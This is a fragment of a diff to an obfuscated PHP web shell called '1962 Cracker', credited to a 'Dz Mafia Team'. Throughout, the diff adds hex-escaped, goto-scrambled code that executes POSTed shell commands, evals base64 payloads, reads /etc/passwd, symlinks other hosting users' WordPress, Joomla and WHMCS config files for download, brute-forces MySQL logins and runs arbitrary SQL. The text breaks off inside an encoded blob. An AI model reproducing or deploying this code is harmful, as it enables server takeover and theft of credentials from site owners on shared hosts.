echo "\11\11\x9\x9\11\x3c\164\145\170\164\141\162\145\141\x20\x64\151\162\75\42\154\x74\162\x22\40\156\141\x6d\145\x3d\42\x54\x65\170\164\x41\x72\x65\x61\61\42\40\163\x74\171\154\x65\x3d\42\x77\x69\144\164\x68\72\40\67\64\65\x70\170\x3b\x20\x68\x65\x69\x67\150\164\x3a\x20\62\x30\64\x70\x78\x22\x3e"; echo shell_exec($_POST["\x63\143\155\x6d\144\144\x32"]); echo "\x9\x9\11\11\11\x3c\57\164\145\170\x74\141\162\x65\141\76"; } echo "\12\11\x9\x9\74\x2f\164\144\76\12\11\11\x3c\x2f\x74\x72\76\12\11\74\x2f\164\141\142\154\145\x3e\12\x9"; die; } goto IumfL; Uv6Nw: eval(base64_decode($Getconfig)); goto uRLNp; ro1Md: ?>
 
     </tr>
 
@@ -565,18 +110,7 @@ symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>cmd ~</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
       <select name="att" dir="rtl"  size="1">
-<?php
- if($_POST['att']==null)
- {
- echo '      <option value="system" selected="">system</option>';
- }else{
- echo "      <option value='$_POST[att]' selected=''>$_POST[att]</option>
-       <option value=system>system</option>
- ";
-
-
- }
-?>
+<?php  goto h4mjw; E4ueD: echo "\74\162\x69\147\150\164\57\76"; goto U6NRr; caNb7: echo realpath(''); goto s6Ehk; NTtQK: ?>
 
        <option value="passthru">passthru</option>
        <option value="exec">exec</option>
@@ -602,124 +136,60 @@ symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Path ~</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
   <strong>
-  <input name="pathclass" type="text" style="width: 284px" value="<?php echo realpath('')?>"></strong></td>
-    </tr>
+  <input name="pathclass" type="text" style="width: 284px" value="<?php  goto caNb7; CaZRM: echo "\74\142\76\x3c\142\x72\76" . php_uname() . "\x3c\142\x72\x3e\74\x2f\x62\76"; goto BT82_; UAL2P: echo "\x3c\146\x6f\156\164\40\x63\157\x6c\x6f\x72\75\x72\145\x64\x20\163\x69\172\145\x3d\62\x20\146\141\x63\145\x3d\x22\143\157\155\x69\143\40\163\x61\x6e\163\x20\x6d\163\42\76"; goto FFhdh; S7Oz9: if ($_POST["\x70\x61\x67\x65"] == "\146\151\156\144") { if (isset($_POST["\x75\163\145\162\x6e\141\x6d\x65\163"]) && isset($_POST["\160\x61\x73\x73\x77\x6f\x72\x64\x73"])) { if ($_POST["\x74\171\160\145"] == "\x70\141\163\x73\167\144") { $e = explode("\xa", $_POST["\x75\x73\145\x72\156\x61\x6d\145\163"]); foreach ($e as $value) { $k = explode("\72", $value); $username .= $k["\60"] . "\40"; } } elseif ($_POST["\x74\x79\160\x65"] == "\x73\151\155\x70\154\145") { $username = str_replace("\xa", "\40", $_POST["\165\x73\145\x72\x6e\x61\155\145\x73"]); } $a1 = explode("\x20", $username); $a2 = explode("\12", $_POST["\x70\141\x73\x73\167\157\x72\144\x73"]); $id2 = count($a2); $ok = 0; foreach ($a1 as $user) { if ($user !== '') { $user = trim($user); for ($i = 0; $i <= $id2; $i++) { $pass = trim($a2[$i]); if (@mysqli_connect("\154\157\x63\x61\154\x68\157\x73\x74", $user, $pass)) { echo "\x3c\x63\160\141\156\x65\x6c\76{$user}\x7c{$pass}\74\57\x63\x70\x61\156\145\x6c\76\x3c\x62\162\40\x2f\76"; $ok++; } } } } echo "\74\150\x72\76\74\x62\76\131\157\x75\40\106\x6f\x75\x6e\x64\40\x3c\x66\157\156\x74\40\143\157\x6c\x6f\162\75\147\x72\145\145\156\76{$ok}\x3c\57\146\157\156\164\76\x20\143\x50\x61\x6e\145\x6c\40\50\61\x39\66\62\103\x72\x61\x63\x6b\x65\x72\x29\x3c\57\x62\x3e"; die; } } goto Y9K52; Q2vpM: error_reporting(0); goto UAL2P; Y3dIo: @error_reporting(0); goto tcVk3; svl5Y: echo "\74\162\x69\x67\x68\x74\x3e"; goto fNIyb; h4mjw: if ($_POST["\141\x74\x74"] == null) { echo "\x20\40\40\40\x20\40\74\157\x70\x74\151\x6f\156\40\166\141\x6c\165\x65\75\x22\x73\x79\163\164\145\x6d\x22\x20\163\145\x6c\145\x63\164\x65\144\75\x22\x22\x3e\163\171\x73\x74\x65\x6d\74\57\x6f\160\x74\x69\157\156\x3e"; } else { echo "\40\40\40\x20\40\40\74\x6f\160\x74\151\157\x6e\x20\x76\141\x6c\165\x65\x3d\x27{$_POST["\x61\164\x74"]}\47\x20\x73\x65\154\x65\143\x74\x65\144\75\x27\47\76{$_POST["\141\164\164"]}\74\57\157\x70\x74\151\157\156\x3e\xa\40\40\40\40\x20\40\x20\x3c\x6f\160\x74\151\x6f\156\x20\166\x61\154\x75\x65\x3d\163\x79\x73\164\x65\155\x3e\x73\x79\163\164\x65\x6d\74\x2f\157\160\164\x69\x6f\x6e\76\12\x20"; } goto NTtQK; qUn3W: if (isset($_POST["\x75\x73\x72\x65"])) { ?>
+<form method=post>
+<textarea rows=10 cols=30 name=user><?php  $users = file("\x2f\x65\164\143\x2f\x70\141\x73\163\x77\x64"); foreach ($users as $user) { $str = explode("\72", $user); echo $str[0] . "\xa"; } ?>
+</textarea><br><br>
+<input type=submit name=su value=" Get Configuration Files :)" /></form>
+<?php  } goto Q2vpM; qzqI_: echo "\74\x69\x6e\x70\x75\164\x20\164\x79\x70\x65\x3d\x22\146\151\154\145\42\x20\156\141\x6d\145\x3d\x22\146\151\x6c\x65\x22\40\x73\151\172\x65\x3d\x22\x35\60\x22\x3e\74\x69\x6e\160\165\x74\40\x6e\x61\155\x65\x3d\x22\137\165\x70\154\42\40\164\x79\x70\x65\x3d\42\x73\165\142\155\151\x74\42\x20\151\x64\x3d\x22\137\165\x70\154\42\x20\166\141\x6c\165\145\75\42\125\x70\x6c\157\x61\144\x22\x3e\x3c\x2f\x66\x6f\162\x6d\x3e"; goto oxNHr; FFhdh: if (isset($_POST["\163\x75"])) { $dir = mkdir("\144\x7a\155\141\146\x69\x61", 511); $r = "\40\117\160\x74\151\x6f\156\163\40\x61\154\x6c\x20\12\40\104\151\x72\x65\x63\164\x6f\162\171\x49\x6e\144\x65\x78\x20\144\172\56\x68\164\155\x6c\x20\12\40\x52\145\161\x75\151\162\145\40\116\157\x6e\x65\40\xa\x20\123\141\x74\151\x73\146\x79\40\101\156\x79"; $f = fopen("\144\x7a\x6d\141\x66\151\x61\x2f\x2e\150\164\141\x63\143\145\163\x73", "\x77"); fwrite($f, $r); $consym = "\74\141\x20\150\x72\x65\146\75\144\172\155\x61\x66\151\x61\x2f\x3e\74\146\157\156\164\40\143\x6f\154\x6f\162\x3d\167\150\151\164\145\40\163\151\x7a\145\x3d\63\x20\x66\141\x63\x65\75\42\143\157\155\151\143\40\163\141\156\163\40\155\163\42\76\143\x6f\156\146\151\147\x75\162\x61\x74\x69\x6f\156\40\146\151\154\145\163\x3c\57\146\x6f\156\164\76\74\57\x61\76"; echo "\74\142\162\76\x66\157\x6c\144\x65\x72\40\167\150\145\x72\x65\x20\143\157\156\x66\151\147\40\146\151\x6c\x65\163\40\x68\141\x73\40\x62\145\x65\156\x20\x73\171\155\x6c\x69\x6e\153\145\x64\x20\102\x79\x20\124\x68\x65\40\61\71\x36\x32\40\x53\x63\162\151\160\x74\40\103\x6f\x64\145\x64\x20\102\x79\40\x41\x6b\x72\141\x6d\40\123\x74\x65\154\154\145\x20\x28\x44\x7a\40\115\x61\146\x69\x61\x20\x54\x65\141\155\x29\74\x62\162\x3e\74\x75\x3e\x3c\146\x6f\x6e\164\x20\143\x6f\x6c\157\162\75\162\145\144\x20\163\x69\172\x65\x3d\x32\x20\146\141\143\145\x3d\x22\x63\157\x6d\x69\x63\40\163\141\156\163\40\x6d\163\42\76{$consym}\74\57\x66\x6f\156\x74\x3e\x3c\x2f\165\76"; $usr = explode("\12", $_POST["\x75\163\x65\x72"]); foreach ($usr as $uss) { $us = trim($uss); $r = "\144\172\155\x61\x66\151\141\57"; symlink("\x2f\x68\x6f\155\x65\57" . $us . "\x2f\160\x75\142\154\151\x63\x5f\x68\164\155\154\x2f\x77\160\55\143\157\156\x66\x69\x67\x2e\160\150\x70", $r . $us . "\x2e\56\167\x70\55\x63\x6f\x6e\146\151\147"); symlink("\57\150\157\155\145\57" . $us . "\57\x70\x75\x62\154\x69\x63\x5f\150\164\155\x6c\57\x77\157\x72\144\x70\x72\145\163\x73\x2f\x77\x70\x2d\x63\157\x6e\146\x69\x67\x2e\160\x68\160", $r . $us . "\x2e\56\167\157\162\144\55\x77\x70"); symlink("\57\x68\x6f\155\145\57" . $us . "\57\x70\x75\142\x6c\151\143\137\x68\164\155\x6c\57\x62\x6c\157\x67\x2f\x77\160\55\143\x6f\156\146\x69\147\56\x70\x68\160", $r . $us . "\x2e\x2e\x77\x70\x62\x6c\x6f\147"); symlink("\57\x68\157\155\x65\x2f" . $us . "\57\160\165\142\x6c\x69\143\x5f\x68\164\155\154\57\x63\157\156\146\x69\147\165\x72\x61\164\x69\x6f\156\56\x70\150\160", $r . $us . "\x2e\56\152\x6f\157\x6d\x6c\x61\x2d\157\x72\55\x77\150\x6d\x63\x73"); symlink("\x2f\x68\x6f\155\x65\57" . $us . "\x2f\160\x75\142\154\x69\x63\x5f\150\x74\x6d\154\x2f\x6a\x6f\x6f\155\x6c\x61\57\143\157\x6e\x66\151\147\x75\162\x61\164\151\x6f\x6e\56\160\150\160", $r . $us . "\56\x2e\x6a\157\157\x6d\x6c\x61"); symlink("\x2f\x68\157\155\x65\x2f" . $us . "\x2f\160\165\x62\154\151\143\x5f\x68\164\155\154\x2f\x76\x62\x2f\151\156\143\154\165\144\x65\163\x2f\143\x6f\156\146\x69\147\56\160\150\x70", $r . $us . "\x2e\x2e\x76\142\x69\156\143"); symlink("\x2f\150\x6f\155\x65\57" . $us . "\57\160\165\x62\154\151\x63\x5f\x68\164\x6d\154\57\151\x6e\x63\154\x75\x64\x65\163\x2f\x63\157\156\146\151\x67\56\x70\x68\160", $r . $us . "\x2e\56\x76\142"); symlink("\57\x68\x6f\x6d\145\57" . $us . "\x2f\x70\165\142\154\151\x63\137\x68\164\x6d\x6c\x2f\143\x6f\156\x66\x5f\147\x6c\x6f\x62\x61\x6c\x2e\x70\x68\160", $r . $us . "\56\56\x63\157\x6e\146\x5f\147\154\x6f\142\141\x6c"); symlink("\57\150\x6f\x6d\x65\57" . $us . "\57\160\165\142\x6c\151\x63\137\150\164\x6d\x6c\x2f\151\156\143\x2f\x63\x6f\156\x66\151\147\56\x70\150\160", $r . $us . "\56\56\x69\x6e\143"); symlink("\57\150\x6f\x6d\145\57" . $us . "\x2f\x70\x75\x62\x6c\151\143\137\x68\x74\x6d\x6c\57\x63\x6f\156\x66\x69\147\x2e\x70\150\160", $r . $us . "\56\x2e\x63\157\156\146\151\x67"); symlink("\57\150\x6f\x6d\145\x2f" . $us . "\57\x70\165\142\154\x69\x63\137\150\164\x6d\154\57\123\x65\164\164\151\x6e\x67\x73\x2e\x70\x68\160", $r . $us . "\56\56\x53\145\164\164\151\x6e\x67\x73"); symlink("\57\x68\157\x6d\145\57" . $us . "\x2f\x70\165\x62\x6c\x69\143\137\x68\164\x6d\154\57\x73\151\x74\x65\163\x2f\144\145\x66\141\x75\x6c\x74\x2f\x73\x65\x74\164\151\x6e\147\163\x2e\x70\x68\x70", $r . $us . "\56\x2e\163\x69\x74\145\x73"); symlink("\57\150\x6f\x6d\145\x2f" . $us . "\57\x70\165\x62\x6c\x69\143\137\150\164\155\154\x2f\167\150\x6d\57\x63\x6f\156\146\x69\x67\165\162\x61\164\x69\157\156\x2e\x70\150\160", $r . $us . "\56\x2e\167\x68\155"); symlink("\57\150\157\x6d\x65\57" . $us . "\x2f\160\165\x62\x6c\x69\143\x5f\150\x74\x6d\x6c\x2f\x77\150\155\x63\163\x2f\143\157\x6e\146\151\x67\x75\162\141\x74\151\x6f\x6e\x2e\x70\150\160", $r . $us . "\56\x2e\167\150\155\x63\163"); symlink("\57\150\x6f\x6d\145\x2f" . $us . "\57\x70\165\x62\x6c\151\143\137\150\164\x6d\154\x2f\x73\165\160\x70\x6f\x72\x74\57\143\x6f\156\x66\x69\147\165\162\141\164\x69\x6f\x6e\x2e\160\x68\x70", $r . $us . "\x2e\56\x73\165\x70\160\x6f\x72\167\x68\155\x63\x73"); symlink("\57\x68\157\x6d\145\x2f" . $us . "\57\160\x75\x62\x6c\x69\x63\x5f\x68\164\155\x6c\57\167\150\x6d\x63\x2f\x57\x48\115\57\143\x6f\156\146\x69\147\x75\x72\141\x74\x69\157\x6e\56\x70\x68\x70", $r . $us . "\56\56\x57\110\x4d"); symlink("\57\150\x6f\x6d\x65\57" . $us . "\x2f\160\165\142\x6c\151\x63\x5f\150\164\x6d\154\x2f\167\150\x6d\57\x57\110\115\x43\123\57\143\157\x6e\146\151\147\x75\x72\141\164\151\x6f\156\56\160\150\x70", $r . $us . "\x2e\x2e\167\150\155\x63"); symlink("\x2f\150\157\155\145\x2f" . $us . "\x2f\x70\165\142\x6c\x69\x63\137\150\x74\155\x6c\57\x77\x68\x6d\57\x77\x68\155\143\x73\x2f\143\157\156\146\x69\147\x75\162\x61\x74\151\x6f\x6e\x2e\160\150\x70", $r . $us . "\56\x2e\127\x48\x4d\x63\x73"); symlink("\x2f\x68\157\x6d\145\57" . $us . "\57\x70\x75\142\x6c\x69\x63\137\150\164\155\x6c\x2f\163\x75\160\160\157\x72\164\x2f\x63\x6f\156\x66\x69\x67\x75\162\141\x74\x69\157\x6e\56\x70\x68\x70", $r . $us . "\56\x2e\x77\150\155\143\163\165\x70\x70"); symlink("\57\x68\157\155\x65\57" . $us . "\x2f\160\165\x62\x6c\151\x63\137\150\x74\155\154\57\143\x6c\x69\145\x6e\x74\x73\x2f\143\157\x6e\x66\x69\147\x75\x72\141\x74\x69\157\156\56\160\150\160", $r . $us . "\56\x2e\x77\x68\155\143\x73\x2d\143\154\151"); symlink("\x2f\150\157\155\x65\x2f" . $us . "\x2f\160\165\x62\x6c\151\x63\137\150\164\x6d\154\57\143\x6c\151\x65\156\164\57\x63\x6f\x6e\x66\x69\147\165\162\x61\164\x69\x6f\x6e\x2e\x70\150\x70", $r . $us . "\56\x2e\x77\x68\x6d\143\163\55\143\x6c"); symlink("\57\x68\x6f\155\145\x2f" . $us . "\x2f\160\x75\142\x6c\151\x63\x5f\x68\x74\x6d\x6c\x2f\x63\x6c\151\145\156\x74\x65\163\x2f\x63\157\156\x66\151\147\165\162\x61\x74\151\x6f\156\x2e\160\150\x70", $r . $us . "\56\56\167\150\155\143\x73\x2d\x43\114"); symlink("\57\x68\x6f\155\x65\x2f" . $us . "\x2f\x70\165\x62\x6c\x69\x63\x5f\150\x74\155\x6c\57\x63\154\151\x65\156\164\x65\x2f\143\x6f\156\146\x69\147\165\162\141\164\x69\157\156\x2e\x70\150\x70", $r . $us . "\56\x2e\167\150\x6d\143\163\x2d\103\x6c"); symlink("\57\150\x6f\x6d\x65\x2f" . $us . "\x2f\x70\165\142\x6c\x69\143\137\150\x74\155\x6c\57\143\154\x69\145\156\164\x73\165\160\160\157\x72\164\57\143\x6f\156\146\x69\147\165\x72\141\x74\151\157\x6e\x2e\160\150\160", $r . $us . "\56\x2e\167\150\155\143\x73\x2d\x63\x73\165\x70"); symlink("\57\150\x6f\x6d\x65\57" . $us . "\57\160\165\x62\x6c\x69\143\x5f\150\x74\155\x6c\x2f\142\x69\x6c\154\151\156\x67\57\x63\x6f\x6e\x66\151\147\x75\162\x61\x74\x69\x6f\156\x2e\x70\x68\160", $r . $us . "\56\x2e\x77\150\155\x63\163\55\x62\x69\154\154"); symlink("\57\x68\x6f\155\x65\x2f" . $us . "\x2f\x70\x75\142\x6c\x69\143\x5f\150\x74\x6d\x6c\x2f\141\x64\155\151\x6e\57\143\x6f\156\x66\151\x67\56\x70\x68\160", $r . $us . "\x2e\56\141\x64\x6d\151\x6e\x2d\143\157\x6e\x66"); } } goto ro1Md; KGVnY: if (!empty($_POST["\143\143\143\x63"]) && $_POST["\143\143\x63\143"] == "\144\x62\x5f\161\x75\145\162\171") { echo $head; $sql = new my_sql(); $sql->db = $_POST["\144\x62"]; $sql->host = $_POST["\144\x62\137\163\145\x72\166\145\x72"]; $sql->port = $_POST["\x64\x62\137\160\157\162\164"]; $sql->user = $_POST["\155\x79\x73\x71\x6c\x69\x5f\x6c"]; $sql->pass = $_POST["\155\x79\163\161\x6c\151\x5f\160"]; $sql->base = $_POST["\x6d\171\x73\x71\154\x69\137\144\x62"]; $querys = @explode("\73", $_POST["\x64\x62\137\x71\165\x65\162\171"]); echo "\x3c\142\x6f\144\x79\x20\142\147\x63\x6f\x6c\x6f\x72\x3d\x23\x65\64\x65\x30\x64\70\x3e"; if (!$sql->connect()) { echo "\74\144\x69\166\x20\x61\x6c\151\147\156\75\143\145\x6e\x74\x65\x72\76\74\146\x6f\x6e\x74\40\146\141\143\x65\x3d\x56\145\162\x64\141\156\x61\x20\x73\151\172\145\x3d\x2d\62\x20\x63\157\154\x6f\162\75\x72\x65\x64\x3e\x3c\x62\x3e" . $sql->error . "\74\57\x62\76\74\x2f\146\157\x6e\164\x3e\74\57\144\151\x76\76"; } else { if (!empty($sql->base) && !$sql->select_db()) { echo "\x3c\x64\x69\x76\x20\x61\x6c\x69\x67\156\x3d\x63\145\x6e\x74\x65\162\76\74\146\157\x6e\x74\x20\x66\x61\143\145\x3d\126\x65\x72\x64\141\156\141\x20\x73\151\x7a\145\75\55\62\x20\143\157\x6c\x6f\x72\x3d\x72\145\x64\x3e\x3c\x62\x3e" . $sql->error . "\74\57\x62\x3e\74\57\x66\x6f\156\x74\76\74\x2f\144\151\166\x3e"; } else { foreach ($querys as $num => $query) { if (strlen($query) > 5) { echo "\x3c\146\x6f\x6e\x74\40\146\141\x63\145\x3d\x56\145\162\x64\141\x6e\x61\40\x73\151\x7a\x65\75\55\x32\40\143\157\x6c\x6f\x72\75\x67\162\x65\145\x6e\x3e\74\142\76\x51\165\x65\162\171\43" . $num . "\40\x3a\40" . htmlspecialchars($query, ENT_QUOTES) . "\x3c\x2f\x62\x3e\x3c\57\x66\x6f\156\164\x3e\x3c\x62\162\x3e"; switch ($sql->query($query)) { case "\x30": echo "\74\x74\141\142\x6c\145\40\167\151\144\164\150\75\x31\x30\60\x25\76\x3c\x74\162\x3e\74\164\144\x3e\x3c\146\x6f\156\x74\x20\x66\x61\x63\x65\x3d\x56\x65\x72\144\x61\156\x61\40\163\x69\172\x65\75\x2d\x32\76\105\162\162\x6f\x72\x20\72\40\74\142\x3e" . $sql->error . "\x3c\x2f\x62\76\74\x2f\146\x6f\156\x74\x3e\74\57\x74\x64\76\x3c\x2f\164\x72\x3e\x3c\x2f\x74\x61\142\x6c\x65\x3e"; break; case "\x31": if ($sql->get_result()) { echo "\74\164\x61\142\154\145\x20\x77\x69\x64\164\x68\75\x31\x30\x30\x25\x3e"; foreach ($sql->columns as $k => $v) { $sql->columns[$k] = htmlspecialchars($v, ENT_QUOTES); } $keys = @implode("\46\156\x62\163\160\73\74\57\142\x3e\74\57\146\157\156\164\76\74\57\x74\144\76\74\x74\x64\x20\142\147\143\157\x6c\157\162\75\x23\x38\x30\x30\x30\60\x30\x3e\x3c\x66\157\156\x74\40\x66\x61\143\x65\75\126\x65\x72\x64\141\156\x61\40\163\x69\172\x65\x3d\x2d\62\x3e\74\142\76\46\x6e\142\x73\160\73", $sql->columns); echo "\x3c\x74\x72\76\74\164\x64\40\142\x67\x63\x6f\154\x6f\162\x3d\43\x38\60\x30\x30\x30\60\x3e\74\x66\157\156\164\x20\x66\141\x63\145\75\126\x65\162\x64\141\x6e\x61\x20\x73\x69\172\145\x3d\55\62\76\74\x62\76\46\x6e\x62\163\x70\73" . $keys . "\x26\156\x62\163\x70\x3b\74\57\142\76\74\57\x66\157\x6e\x74\x3e\x3c\x2f\x74\x64\x3e\74\57\164\162\x3e"; for ($i = 0; $i < $sql->num_rows; $i++) { foreach ($sql->rows[$i] as $k => $v) { $sql->rows[$i][$k] = htmlspecialchars($v, ENT_QUOTES); } $values = @implode("\x26\156\x62\x73\x70\x3b\x3c\57\x66\x6f\156\x74\x3e\74\x2f\164\144\x3e\74\164\144\x3e\x3c\x66\x6f\x6e\164\40\146\x61\143\x65\x3d\126\x65\162\x64\x61\156\x61\40\163\x69\172\145\75\x2d\62\x3e\46\x6e\142\x73\x70\x3b", $sql->rows[$i]); echo "\74\x74\x72\x3e\74\x74\x64\76\74\146\x6f\x6e\164\x20\x66\x61\143\x65\75\x56\x65\162\x64\x61\x6e\141\40\x73\151\172\x65\75\55\x32\x3e\46\x6e\142\x73\x70\x3b" . $values . "\x26\x6e\142\x73\160\x3b\x3c\57\146\x6f\156\164\76\x3c\57\164\x64\x3e\74\57\x74\x72\x3e"; } echo "\x3c\57\x74\x61\142\x6c\x65\76"; } break; case "\x32": $ar = $sql->affected_rows() ? $sql->affected_rows() : "\x30"; echo "\74\x74\x61\142\x6c\145\x20\x77\x69\144\164\x68\x3d\61\x30\60\45\76\74\x74\x72\x3e\x3c\164\144\x3e\x3c\x66\x6f\156\164\40\x66\x61\x63\145\75\126\145\162\144\x61\156\141\40\x73\x69\172\x65\x3d\x2d\62\x3e\x61\146\x66\x65\x63\x74\x65\144\40\x72\x6f\167\163\40\72\x20\74\142\76" . $ar . "\74\x2f\142\x3e\x3c\x2f\x66\157\x6e\x74\x3e\x3c\x2f\164\x64\x3e\x3c\x2f\x74\162\76\74\x2f\x74\141\142\x6c\145\x3e\74\x62\162\76"; break; } } } } } echo "\x3c\x62\x72\76\x3c\x74\x69\164\154\x65\x3e\61\x39\x36\62\103\x72\141\x63\153\145\x72\40\102\171\x20\x41\153\x72\x61\155\x20\x53\x74\x65\x6c\x6c\145\74\57\x74\151\164\x6c\145\76\x3c\x66\x6f\x72\x6d\x20\x6e\x61\155\x65\x3d\146\157\x72\x6d\40\155\145\164\x68\x6f\x64\x3d\x50\117\123\124\76"; echo in("\150\151\x64\x64\145\156", "\x64\142", 0, $_POST["\144\142"]); echo in("\150\x69\144\x64\x65\x6e", "\x64\x62\x5f\x73\145\x72\x76\x65\162", 0, $_POST["\x64\142\x5f\163\x65\x72\x76\x65\162"]); echo in("\150\x69\144\x64\x65\x6e", "\x64\142\137\x70\x6f\162\x74", 0, $_POST["\144\142\x5f\x70\x6f\x72\164"]); echo in("\x68\151\x64\144\x65\x6e", "\155\x79\163\x71\x6c\x69\137\154", 0, $_POST["\155\171\163\x71\x6c\x69\x5f\154"]); echo in("\150\x69\144\144\x65\x6e", "\x6d\x79\163\161\154\x69\137\x70", 0, $_POST["\155\171\163\x71\154\151\137\160"]); echo in("\x68\151\x64\144\x65\156", "\x6d\171\163\x71\154\151\x5f\x64\x62", 0, $_POST["\x6d\x79\163\161\x6c\x69\x5f\x64\x62"]); echo in("\150\151\144\144\x65\156", "\x63\143\x63\x63", 0, "\144\142\x5f\161\165\x65\x72\x79"); echo "\x3c\144\151\166\x20\141\x6c\x69\147\x6e\75\143\145\156\x74\x65\x72\76"; echo "\x3c\x66\157\x6e\x74\x20\146\141\x63\x65\x3d\126\145\x72\144\141\156\141\x20\163\x69\x7a\x65\75\x2d\x32\76\74\x62\x3e\102\x61\163\x65\72\x20\74\x2f\142\x3e\x3c\151\156\160\x75\164\x20\x74\171\160\x65\x3d\x74\145\x78\164\40\156\141\x6d\145\x3d\155\171\163\x71\154\151\137\x64\142\x20\166\141\154\x75\x65\x3d\42" . $sql->base . "\x22\x3e\x3c\57\x66\x6f\x6e\x74\x3e\x3c\x62\x72\76"; echo "\74\x74\x65\170\164\x61\x72\x65\141\40\x63\x6f\x6c\x73\75\x36\x35\40\x72\157\167\163\75\x31\x30\40\x6e\x61\155\x65\x3d\144\142\x5f\161\165\145\x72\x79\76" . (!empty($_POST["\x64\142\x5f\161\165\x65\162\x79"]) ? $_POST["\144\x62\137\x71\x75\x65\x72\x79"] : "\123\110\117\x57\x20\x44\101\124\101\102\101\123\x45\x53\x3b\xa\x53\105\114\105\103\124\x20\x2a\x20\106\122\117\x4d\x20\165\x73\x65\162\x3b") . "\x3c\57\x74\145\x78\164\x61\162\x65\141\x3e\74\x62\162\76\74\151\x6e\x70\x75\164\40\164\x79\x70\145\x3d\x73\165\x62\x6d\151\164\40\156\141\x6d\x65\x3d\x73\x75\142\155\x69\164\40\166\141\154\x75\x65\x3d\42\40\x52\x75\156\x20\123\x51\114\x20\161\x75\x65\x72\171\40\x22\x3e\x3c\57\144\x69\166\x3e\x3c\142\162\x3e\74\142\x72\76"; echo "\74\57\146\157\162\x6d\x3e"; echo "\x3c\142\162\x3e\x3c\x64\x69\166\x20\141\154\151\x67\x6e\75\x63\145\156\164\145\x72\x3e\74\146\x6f\156\x74\40\146\141\143\145\75\126\x65\162\x64\x61\156\141\x20\x73\151\172\x65\x3d\x2d\62\x3e\x3c\142\x3e\x5b\40\x3c\141\40\150\162\145\146\75" . $_SERVER["\x50\110\120\137\x53\105\114\x46"] . "\x3e\102\101\103\113\74\57\141\x3e\x20\135\x3c\57\x62\x3e\x3c\57\146\157\x6e\164\x3e\x3c\x2f\144\151\166\x3e"; die; } goto Elgqq; poEqs: $Getconfig = "\x4a\110\132\160\x63\x32\154\60\131\x79\101\x39\111\103\122\x66\121\60\x39\120\123\60\x6c\106\127\171\112\x32\141\130\x4e\160\144\x48\115\x69\130\124\x73\116\x43\155\x6c\155\111\103\x67\153\x64\x6d\154\x7a\141\x58\122\x6a\x49\x44\60\x39\x49\103\111\151\113\x53\x42\67\104\121\x6f\x67\x49\103\122\x32\141\x58\x4e\x70\144\x47\115\147\111\104\60\x67\115\x44\x73\116\x43\151\x41\x67\112\x48\132\160\143\x32\x6c\x30\142\63\x49\x67\120\x53\101\153\130\x31\x4e\x46\125\x6c\132\106\125\154\x73\151\125\x6b\126\116\124\x31\x52\x46\130\60\x46\105\x52\106\111\x69\x58\124\x73\116\x43\x69\x41\147\x4a\110\144\154\131\x69\101\x67\x49\x43\x41\147\120\x53\101\x6b\130\x31\x4e\106\x55\x6c\132\106\125\x6c\163\151\123\106\x52\x55\x55\106\71\111\124\x31\x4e\125\x49\x6c\x30\x37\104\121\x6f\147\111\x43\122\160\x62\x6d\x6f\147\x49\x43\101\147\111\104\60\147\x4a\106\71\x54\x52\x56\112\x57\122\126\x4a\x62\111\154\112\106\x55\x56\126\106\125\61\122\x66\x56\x56\112\112\111\x6c\x30\x37\104\x51\x6f\147\x49\103\122\x30\131\x58\112\x6e\x5a\x58\x51\x67\x49\104\60\x67\x63\x6d\x46\63\144\x58\x4a\x73\132\x47\126\x6a\142\62\x52\154\113\103\122\63\132\127\x49\165\x4a\x47\154\x75\x61\151\153\x37\x44\121\x70\x39\104\121\x70\154\142\x48\116\x6c\111\x48\163\x67\112\x48\132\160\x63\62\x6c\60\131\171\x73\x72\117\171\102\x39\x44\x51\160\101\x63\62\x56\60\x59\x32\71\x76\141\62\154\x6c\113\x43\x4a\62\x61\x58\x4e\x70\x64\110\x6f\x69\114\x43\x52\62\x61\x58\x4e\x70\144\107\115\160\x4f\x77\x3d\75"; goto Uv6Nw; xOGR_: if ($safe_mode == "\x31") { echo "\x4f\116"; } else { echo "\117\x46\x46"; } goto rMdK3; tcVk3: eval(base64_decode("\x5a\156\x56\x75\131\x33\122\160\x62\x32\x34\x67\127\105\112\x66\124\61\x4d\x6f\x4a\106\126\x54\122\x56\x4a\146\x51\125\x64\106\124\x6c\x51\160\145\x77\x30\x4b\103\x53\122\x50\x55\61\x39\x46\125\x6c\x4a\x50\x55\x69\101\147\x49\103\101\x39\111\x43\101\x67\x49\x6c\x56\165\141\62\x35\x76\144\x32\64\x67\x54\x31\115\147\125\x47\170\150\x64\x47\132\x76\143\155\60\151\x4f\x77\x30\113\111\103\x41\x67\111\x43\x52\120\125\171\101\x67\120\123\101\x67\111\x47\x46\x79\143\x6d\106\x35\113\x43\x41\x6e\114\63\144\160\142\155\x52\x76\144\x33\115\x67\142\156\121\147\x4d\124\101\166\141\123\143\x67\x49\103\x41\147\x49\103\101\71\x50\151\101\147\x4a\x31\144\x70\x62\x6d\x52\166\x64\x33\115\x67\x4d\x54\x41\x6e\114\101\60\113\x43\x53\101\x67\111\x43\x41\x67\111\x43\x41\x67\x49\103\101\147\111\x43\x41\147\x49\x43\101\x6e\x4c\x33\x64\x70\142\155\x52\x76\x64\x33\115\x67\142\156\121\x67\x4e\151\x34\x7a\114\x32\153\x6e\111\x43\x41\147\111\x43\101\71\120\151\x41\147\112\61\144\160\x62\x6d\x52\x76\144\x33\115\x67\x4f\103\x34\170\112\171\x77\x4e\x43\x67\153\x67\111\103\x41\147\x49\103\101\147\x49\103\101\x67\x49\x43\x41\147\x49\x43\101\x67\112\x79\71\x33\141\x57\x35\153\142\63\x64\x7a\111\x47\x35\x30\x49\104\x59\x75\x4d\x69\71\x70\x4a\171\x41\x67\x49\x43\101\x67\120\x54\x34\147\111\x43\x64\x58\141\x57\x35\153\x62\x33\x64\172\x49\104\147\156\114\101\x30\113\x43\x53\101\147\x49\103\101\x67\x49\103\x41\147\x49\103\x41\147\x49\x43\101\x67\111\103\101\x6e\x4c\x33\144\x70\x62\155\122\166\144\63\115\x67\x62\156\x51\x67\116\151\64\x78\114\x32\153\156\111\103\101\x67\x49\103\101\71\120\x69\x41\147\x4a\x31\x64\160\142\155\x52\x76\144\x33\x4d\147\116\171\143\x73\104\x51\157\112\x49\103\x41\x67\x49\x43\x41\147\x49\x43\101\147\x49\103\101\147\x49\103\101\147\x49\x43\x63\x